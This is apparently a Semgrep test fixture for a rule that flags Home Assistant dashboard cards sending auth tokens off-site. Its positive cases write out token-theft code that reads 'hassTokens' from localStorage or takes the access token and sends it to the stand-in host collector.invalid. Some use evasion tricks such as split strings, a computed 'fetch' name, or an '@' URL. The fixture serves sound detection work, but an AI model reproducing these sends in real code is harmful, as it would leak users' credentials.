// (0.14.0) The constant-propagation copy of card-token-exfil (second pass). It reports
// under card-token-exfil; these are the sends only it sees.

function constantKey() {
  const k = "hassTokens";
  const t = localStorage.getItem(k);
  // ruleid: card-token-exfil-const
  fetch("https://collector.invalid/c", { method: "POST", body: t });
}

// 0.13.0 reported these through Semgrep's own folding; the 0.14.0 main rule has none.
function foldedKey() {
  const t = localStorage.getItem("hass" + "Tokens");
  // ruleid: card-token-exfil-const
  fetch("https://collector.invalid/c", { method: "POST", body: t });
  // Semgrep doesn't fold .concat() inline: js_fold writes "hassTokens" here first
  // (tests/test_js_fold.py), and both passes then report it.
  const u = localStorage.getItem("hass".concat("Tokens"));
  // ok: card-token-exfil-const
  fetch("https://collector.invalid/c", { method: "POST", body: u });
}

function constantSinkName() {
  const t = localStorage.getItem("hassTokens");
  const f = "fetch";
  // ruleid: card-token-exfil-const
  globalThis[f]("https://collector.invalid/c", { method: "POST", body: t });
}

// Same-origin through a constant: proven here, as 0.13.0 did.
const BASE = "/api/my_card";
function legitConstantBase(hass) {
  // ok: card-token-exfil-const
  fetch(BASE + "/x", { headers: { Authorization: hass.auth.data.access_token } });
}

// The case that made 0.14.0 switch constant propagation off: a destructured name that
// shadows a relative constant reads as relative here. The main rule reports it
// (tests/rules/js/token-exfil.js), so the union of both passes keeps it.
const C = "/api/c";
function destructuredShadow(hass, { C }) {
  // todook: card-token-exfil-const
  fetch(C + "/x", { headers: { Authorization: hass.auth.data.access_token } });
}

// (0.15) hassUrl(path): only a path that starts with "/", "?" or "#" stays on HA.
function hassUrlPathsConst(hass) {
  const token = hass.auth.data.access_token;
  // ok: card-token-exfil-const
  fetch(hass.hassUrl("/api/x"), { headers: { Authorization: `Bearer ${token}` } });
  // ruleid: card-token-exfil-const
  fetch(hass.hassUrl("@collector.invalid/c"), { headers: { Authorization: `Bearer ${token}` } });
}

// (0.15) A blob: address never leaves the browser.
async function blobFromHaConst(hass) {
  const token = hass.auth.data.access_token;
  const r = await fetch("/api/acme/doc", { headers: { Authorization: `Bearer ${token}` } });
  // ok: card-token-exfil-const
  window.open(URL.createObjectURL(await r.blob()), "_blank");
}
